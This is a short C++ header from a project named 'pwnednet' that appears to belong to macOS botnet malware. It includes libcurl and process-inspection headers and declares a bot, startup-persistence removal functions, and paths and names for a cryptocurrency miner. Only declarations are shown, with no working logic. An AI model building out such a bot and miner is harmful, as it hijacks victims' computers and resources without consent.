//
//  include.h
//  pwnednet
//
#pragma once

#include <iostream>
#include <fstream>
#include <unistd.h>
#include <stddef.h>
#include <cstdio>
#include <string>
#include <chrono>
#include <vector>
#include <array>
#include <pthread.h>
#include <thread>

#include <sys/stat.h>
#include <sys/param.h>
#include <sys/sysctl.h>
#include <sys/socket.h>
#include <sys/proc_info.h>
#include <libproc.h>

#include <curl/curl.h>
#include <curl//easy.h>


using namespace std;
using namespace chrono;


#include "bot.h"
#include "init.h"
#include "connect.h"
#include "utils.h"


// Move to correct files
void RemoveFromStartup();
void RemoveOldBot();



















extern string fPrivate;
extern string minerMain;
extern string fAssets;
extern string fVar;
extern string fHelper;

extern string minerpath;
extern string minerzip;

extern string szMinerName;
extern const char* MinerName;

extern string newfile;
extern string fOutfile;





